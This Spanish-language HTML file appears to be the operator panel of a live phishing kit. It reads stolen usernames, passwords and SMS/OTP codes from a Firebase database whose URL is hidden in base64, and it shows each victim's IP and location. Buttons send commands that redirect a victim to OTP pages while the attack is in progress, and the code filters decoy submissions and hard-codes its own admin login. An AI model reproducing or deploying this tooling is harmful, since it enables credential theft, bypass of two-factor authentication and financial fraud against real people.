<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>PANEL - Sistema Protegido</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            font-family: 'JetBrains Mono', monospace; 
            color: #fff;
            overflow-x: hidden;
        }
        
        .header {
            background: #0a0a0a;
            border-bottom: 2px solid #6366f1;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            font-weight: 900;
            background: linear-gradient(90deg, #6366f1, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .stats-bar {
            display: flex;
            gap: 20px;
            align-items: center;
        }
        .stat-item {
            background: #111;
            border: 1px solid #222;
            padding: 8px 20px;
            border-radius: 8px;
            font-size: 13px;
        }
        .stat-item span { color: #6366f1; font-weight: bold; }
        
        .btn-header {
            padding: 10px 25px;
            border: none;
            border-radius: 8px;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-pink { background: #be185d; color: white; }
        .btn-dark { background: #1a1a1a; border: 1px solid #333; color: #888; }
        .btn-dark:hover { border-color: #6366f1; color: #6366f1; }
        
        .table-container {
            padding: 20px 30px;
        }
        .table-header {
            display: grid;
            grid-template-columns: 80px 120px 140px 140px 100px 140px 140px 1fr;
            gap: 10px;
            padding: 15px;
            background: #0a0a0a;
            border-bottom: 2px solid #6366f1;
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #666;
            font-weight: bold;
        }
        
        .data-row {
            display: grid;
            grid-template-columns: 80px 120px 140px 140px 100px 140px 140px 1fr;
            gap: 10px;
            padding: 15px 10px;
            background: #0f0f0f;
            border-left: 4px solid #6366f1;
            margin-bottom: 8px;
            align-items: center;
            transition: all 0.3s;
        }
        .data-row:hover { background: #1a1a1a; }
        .data-row.spam { border-left-color: #ef4444; opacity: 0.6; background: #1a0505; }
        .data-row.nuevo { 
            animation: flashNuevo 2s;
            border-left-color: #10b981;
            background: #0a1f15;
        }
        .data-row.nuevo-otp { 
            animation: flashOTP 2s;
            border-left-color: #8b5cf6;
            background: #1a0f2e;
        }
        @keyframes flashNuevo {
            0%, 100% { box-shadow: 0 0 0 rgba(16, 185, 129, 0); }
            50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.5); }
        }
        @keyframes flashOTP {
            0%, 100% { box-shadow: 0 0 0 rgba(139, 92, 246, 0); }
            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.5); }
        }
        
        .cell-status { display: flex; align-items: center; gap: 8px; font-size: 11px; font-weight: bold; }
        .live-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        
        .cell-tipo { font-size: 12px; }
        .cell-tipo .tipo-main { color: #fff; font-weight: bold; text-transform: uppercase; }
        .cell-tipo .tipo-sub { color: #6366f1; font-size: 9px; }
        
        .cell-user { font-family: 'JetBrains Mono', monospace; color: #3b82f6; font-weight: bold; font-size: 13px; overflow: hidden; text-overflow: ellipsis; }
        .cell-pass { font-family: 'JetBrains Mono', monospace; color: #ef4444; font-weight: bold; font-size: 13px; overflow: hidden; text-overflow: ellipsis; }
        
        .cell-token { font-family: 'JetBrains Mono', monospace; color: #10b981; font-weight: bold; font-size: 14px; background: #0a1f15; padding: 5px 10px; border-radius: 5px; text-align: center; border: 1px solid #10b981; }
        .cell-token.vacio { color: #666; background: #1a1a1a; border: 1px solid #333; }
        
        .cell-ip { font-family: 'JetBrains Mono', monospace; color: #f59e0b; font-size: 11px; }
        .cell-geo { color: #888; font-size: 11px; }
        
        .actions { display: flex; gap: 5px; justify-content: flex-end; }
        .btn-action { padding: 6px 12px; border: none; border-radius: 5px; font-size: 9px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        .btn-sms1 { background: #d97706; color: white; }
        .btn-sms2 { background: #ea580c; color: white; }
        .btn-reject { background: #374151; color: #9ca3af; }
        .btn-delete { background: #dc2626; color: white; }
        
        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
        .login-box { background: #0a0a0a; border: 2px solid #6366f1; padding: 50px; border-radius: 10px; width: 100%; max-width: 400px; text-align: center; }
        .login-box h2 { font-family: 'Orbitron', sans-serif; font-size: 28px; margin-bottom: 30px; color: #6366f1; }
        .login-box input { width: 100%; background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 15px; color: #fff; font-family: 'JetBrains Mono', monospace; border-radius: 5px; }
        .login-box button { width: 100%; background: #6366f1; color: white; border: none; padding: 15px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; letter-spacing: 2px; }
        
        .notificacion-flotante { position: fixed; top: 100px; right: 30px; padding: 20px 30px; background: #0a0a0a; border-left: 4px solid #10b981; color: white; font-weight: bold; z-index: 200; transform: translateX(500px); transition: transform 0.3s; }
        .notificacion-flotante.mostrar { transform: translateX(0); }
        .notificacion-otp { border-left-color: #8b5cf6; }
        
        .badge-count { background: #6366f1; color: white; padding: 2px 6px; border-radius: 8px; font-size: 9px; margin-left: 3px; }
    </style>
</head>
<body>

    <div id="notificacion" class="notificacion-flotante">
        <i class="fa-solid fa-bell mr-2"></i>
        <span id="notificacion-texto">Nuevo cliente</span>
    </div>

    <div id="login-overlay">
        <div class="login-box">
            <h2>🔐 ACCESO PANEL</h2>
            <input type="text" id="admin-user" placeholder="USUARIO">
            <input type="password" id="admin-pass" placeholder="CONTRASEÑA">
            <button onclick="validarAcceso()">ENTRAR</button>
            <p id="error-msg" style="color: #ef4444; margin-top: 15px; display: none;">Credenciales incorrectas</p>
        </div>
    </div>

    <div id="panel-content" style="display: none;">
        <div class="header">
            <div class="logo">PANEL PROTEGIDO</div>
            
            <div class="stats-bar">
                <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
                <div class="stat-item">ONLINE: <span id="stat-online" style="color: #10b981;">0</span></div>
                <div class="stat-item">SPAM: <span id="stat-spam" style="color: #ef4444;">0</span></div>
                <div class="stat-item">IPs: <span id="stat-ips">0</span></div>
                <div class="stat-item">BLOQ: <span id="stat-blocked" style="color: #dc2626;">0</span></div>
            </div>
            
            <div style="display: flex; gap: 10px;">
                <button class="btn-header btn-dark" onclick="cambiarVista('validos')">REGISTROS</button>
                <button class="btn-header btn-dark" onclick="cambiarVista('spam')">SPAM</button>
                <button class="btn-header btn-dark" onclick="cambiarVista('ips')">IPs</button>
                <button class="btn-header btn-pink" onclick="limpiarTests()">LIMPIAR</button>
                <button class="btn-header btn-dark" onclick="cerrarSesion()">SALIR</button>
            </div>
        </div>

        <div class="table-container">
            <div class="table-header">
                <div>ESTADO</div>
                <div>TIPO</div>
                <div>USUARIO</div>
                <div>CONTRASEÑA</div>
                <div>TOKEN</div>
                <div>IP</div>
                <div>UBICACIÓN</div>
                <div style="text-align: right;">ACCIONES</div>
            </div>
            <div id="container"></div>
        </div>
    </div>

    <script>
        const DB_URL = atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=");
        let db;
        let vistaActual = 'validos';
        let datos = { validos: [], spam: [], blacklist: {} };
        let contadorIPs = {};
        let idsConocidos = new Set();
        let tokensConocidos = new Set();
        let audioAutorizado = false;

        // SONIDOS
        const sonido = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
        sonido.volume = 1.0;

        function playSound() {
            if (!audioAutorizado) return;
            try {
                const a = sonido.cloneNode();
                a.volume = 1.0;
                a.play().catch(() => {});
            } catch(e) {}
        }

        function mostrarNotificacion(texto, esOTP) {
            const notif = document.getElementById('notificacion');
            document.getElementById('notificacion-texto').textContent = texto;
            notif.className = 'notificacion-flotante mostrar ' + (esOTP ? 'notificacion-otp' : '');
            setTimeout(() => notif.classList.remove('mostrar'), 3000);
        }

        function esSpam(id, data) {
            if (!data || typeof data !== 'object') return true;
            if (!data.user || !data.pass) return true;
            
            const spamPatterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass', 'login'];
            if (spamPatterns.some(s => id.toLowerCase().includes(s))) return true;
            
            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'user1', '123456'];
            if (spamUsers.includes((data.user || '').toLowerCase())) return true;
            
            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'password', '123456'];
            if (spamPasses.includes((data.pass || '').toLowerCase())) return true;
            
            if (data.user.length < 3 || data.pass.length < 3) return true;
            if (data.ip && datos.blacklist[data.ip]) return true;
            
            return false;
        }

        function validarAcceso() {
            const u = document.getElementById('admin-user').value;
            const p = document.getElementById('admin-pass').value;
            if (u === "Ghost" && p === "Cabimas01.") {
                sessionStorage.setItem('auth_panel', 'true');
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('panel-content').style.display = 'block';
                
                // AUTORIZAR AUDIO CON PRIMER CLICK
                audioAutorizado = true;
                playSound(); // Sonido de bienvenida
                
                iniciarFirebase();
            } else {
                document.getElementById('error-msg').style.display = 'block';
            }
        }

        if (sessionStorage.getItem('auth_panel') === 'true') {
            document.getElementById('login-overlay').style.display = 'none';
            document.getElementById('panel-content').style.display = 'block';
            audioAutorizado = true;
            iniciarFirebase();
        }

        function cerrarSesion() {
            sessionStorage.removeItem('auth_panel');
            window.location.reload();
        }

        function iniciarFirebase() {
            const firebaseConfig = { databaseURL: DB_URL };
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            db = firebase.database();

            // ESCUCHA EN TIEMPO REAL
            db.ref('logins').on('value', (snap) => {
                const validos = [];
                contadorIPs = {};
                const idsActuales = new Set();
                const tokensActuales = new Set();
                
                snap.forEach((child) => {
                    const data = child.val();
                    const id = child.key;
                    
                    if (esSpam(id, data)) {
                        db.ref('spam/' + id).set({...data, deletedAt: Date.now()});
                        db.ref('logins/' + id).remove();
                        return;
                    }
                    
                    if (data.ip && data.ip !== 'unknown') {
                        contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                    }
                    
                    // Verificar si es nuevo
                    if (!idsConocidos.has(id) && idsConocidos.size > 0) {
                        playSound();
                        mostrarNotificacion('¡NUEVO CLIENTE!', false);
                    }
                    idsActuales.add(id);
                    
                    // Verificar token nuevo
                    const token = data.sms || data.otp || '';
                    if (token && token !== '' && token !== '----') {
                        const tokenKey = id + ':' + token;
                        if (!tokensConocidos.has(tokenKey) && tokensConocidos.size > 0) {
                            playSound();
                            mostrarNotificacion('¡TOKEN RECIBIDO!', true);
                        }
                        tokensActuales.add(tokenKey);
                    }
                    
                    validos.push({ id, data, esSpam: false });
                });
                
                idsConocidos = idsActuales;
                tokensConocidos = tokensActuales;
                datos.validos = validos;
                
                renderizar();
            });

            db.ref('spam').on('value', (snap) => {
                datos.spam = [];
                snap.forEach((child) => {
                    datos.spam.push({ id: child.key, data: child.val(), esSpam: true });
                });
                renderizar();
            });

            db.ref('blacklist').on('value', (snap) => {
                datos.blacklist = snap.val() || {};
                document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
                renderizar();
            });
        }

        function cambiarVista(vista) {
            vistaActual = vista;
            renderizar();
        }

        function limpiarTests() {
            if(!confirm('¿Eliminar registros de prueba?')) return;
            datos.validos.forEach(({id, data}) => {
                if(id.toLowerCase().includes('test') || (data.user || '').toLowerCase().includes('test')) {
                    db.ref('spam/' + id).set({...data});
                    db.ref('logins/' + id).remove();
                }
            });
        }

        function renderizar() {
            const container = document.getElementById('container');
            container.innerHTML = '';

            document.getElementById('stat-total').textContent = datos.validos.length;
            document.getElementById('stat-spam').textContent = datos.spam.length;
            document.getElementById('stat-online').textContent = datos.validos.filter(d => d.data.online).length;
            document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;

            if (vistaActual === 'ips') { renderizarIPs(); return; }

            let aMostrar = vistaActual === 'validos' ? datos.validos : 
                          vistaActual === 'spam' ? datos.spam : 
                          [...datos.validos, ...datos.spam];

            if (aMostrar.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN REGISTROS</div>';
                return;
            }

            aMostrar.forEach(({id, data, esSpam}) => {
                const token = data.sms || data.otp || '';
                const tieneOTP = token && token !== '' && token !== '----';
                const vecesIP = contadorIPs[data.ip] || 1;
                const ipBloqueada = data.ip && datos.blacklist[data.ip];
                
                const esNuevo = idsConocidos.has(id) && !esSpam;
                const esNuevoOTP = tieneOTP && tokensConocidos.has(id + ':' + token);
                
                let rowClass = 'data-row';
                if (esSpam) rowClass += ' spam';
                if (esNuevo) rowClass += ' nuevo';
                
                const tipoTexto = tieneOTP ? 'TOKEN OK' : 'CREDENCIALES';
                
                container.innerHTML += `
                    <div class="${rowClass}">
                        <div class="cell-status"><div class="live-dot"></div>LIVE</div>
                        <div class="cell-tipo">
                            <div class="tipo-main" style="${tieneOTP ? 'color: #10b981;' : ''}">${tipoTexto}</div>
                            <div class="tipo-sub">${esSpam ? 'SPAM' : 'INGRESANDO'}</div>
                        </div>
                        <div class="cell-user">${data.user || 'N/A'}</div>
                        <div class="cell-pass">${data.pass || '****'}</div>
                        ${tieneOTP ? `<div class="cell-token">${token}</div>` : `<div class="cell-token vacio">----</div>`}
                        <div class="cell-ip">${data.ip || 'N/A'}${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}</div>
                        <div class="cell-geo">${ipBloqueada ? '[BLOQUEADA] ' : ''}${data.location || 'Desconocida'}</div>
                        <div class="actions">
                            ${!esSpam ? `
                                <button class="btn-action btn-sms1" onclick="db.ref('comandos/${id}').set({redirect: 'otp.html'})">SMS 1</button>
                                <button class="btn-action btn-sms2" onclick="db.ref('comandos/${id}').set({redirect: 'otp2.html'})">SMS 2</button>
                                <button class="btn-action btn-reject" onclick="db.ref('comandos/${id}').set({redirect: 'index.html'}); db.ref('logins/${id}').update({step: 'Rechazado'})">RECHAZAR</button>
                                <button class="btn-action btn-delete" onclick="db.ref('logins/${id}').remove()">ELIMINAR</button>
                            ` : `
                                <button class="btn-action btn-sms1" onclick="recuperar('${id}')">RECUPERAR</button>
                                <button class="btn-action btn-delete" onclick="db.ref('spam/${id}').remove()">ELIMINAR</button>
                            `}
                        </div>
                    </div>
                `;
            });
        }

        function renderizarIPs() {
            const container = document.getElementById('container');
            const ipsOrdenadas = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
            
            if (ipsOrdenadas.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN IPs</div>';
                return;
            }

            let html = '<div style="background: #0a0a0a; padding: 20px; border-radius: 10px;"><table style="width: 100%; border-collapse: collapse;">';
            html += '<tr style="color: #666; font-size: 12px; border-bottom: 1px solid #333;"><th>IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
            
            ipsOrdenadas.forEach(([ip, count]) => {
                const bloqueada = datos.blacklist[ip];
                html += `<tr style="border-bottom: 1px solid #1a1a1a;">
                    <td style="padding: 15px; color: ${bloqueada ? '#dc2626' : '#f59e0b'};">${ip}</td>
                    <td style="padding: 15px;"><span style="background: ${count >= 10 ? '#dc2626' : count >= 5 ? '#f59e0b' : '#10b981'}; color: white; padding: 2px 10px; border-radius: 10px; font-size: 11px;">${count}</span></td>
                    <td style="padding: 15px; color: ${bloqueada ? '#dc2626' : '#10b981'};">${bloqueada ? 'BLOQUEADA' : 'ACTIVA'}</td>
                    <td style="padding: 15px;"><button onclick="toggleBlockIP('${ip}')" class="btn-action ${bloqueada ? 'btn-sms1' : 'btn-delete'}" style="padding: 5px 15px; font-size: 10px;">${bloqueada ? 'DESBLOQUEAR' : 'BLOQUEAR'}</button></td>
                </tr>`;
            });
            
            html += '</table></div>';
            container.innerHTML = html;
        }

        function toggleBlockIP(ip) {
            if (!ip) return;
            const ipKey = ip.replace(/\./g, '_');
            if (datos.blacklist[ip]) {
                if (confirm(`¿Desbloquear ${ip}?`)) db.ref('blacklist/' + ipKey).remove();
            } else {
                if (confirm(`¿BLOQUEAR ${ip}?`)) {
                    db.ref('blacklist/' + ipKey).set({ ip, since: Date.now(), count: contadorIPs[ip] || 1 });
                }
            }
        }

        function recuperar(id) {
            db.ref('spam/' + id).once('value').then(snap => {
                const d = snap.val();
                if(d) { db.ref('logins/' + id).set(d); db.ref('spam/' + id).remove(); }
            });
        }
    </script>
</body>
</html>
